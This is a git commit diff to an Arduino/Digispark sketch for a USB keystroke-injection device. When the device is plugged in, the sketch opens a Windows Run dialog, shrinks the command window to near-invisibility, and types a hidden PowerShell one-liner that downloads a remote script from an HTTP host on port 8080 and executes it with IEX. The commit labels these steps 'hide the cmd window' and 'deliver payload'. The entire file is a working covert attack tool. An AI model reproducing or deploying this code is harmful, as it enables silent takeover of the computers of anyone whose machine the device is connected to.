3a50796bc1c9bae2e55a0c9d01a9ddcc23a15fde
Xre0uS <hello@xre0us.io>
2025-03-23 17:15:19 +0800

    Update main.cpp

--- main.cpp
+++ main.cpp
@@ -1,9 +1,9 @@
 #include "DigiKeyboard.h"
 
 void setup() {
-  // don't need to set anything up to use DigiKeyboard
   DigiKeyboard.sendKeyStroke(0);
-
+  
+  //hide the cmd window
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
   DigiKeyboard.delay(60);
   DigiKeyboard.println("CMD  /q /d /f:off /v:on /k MODE con: cols=20 lines=1");
@@ -16,6 +16,7 @@ void setup() {
   DigiKeyboard.sendKeyPress(0);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   
+  //deliver payload
   DigiKeyboard.println("powershell.exe -nop -w hidden -c $c=new-object net.webclient;$c.proxy=[Net.WebRequest]::GetSystemWebProxy();$c.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $c.downloadstring('http://192.168.1.10:8080/exploit');");
   }
 
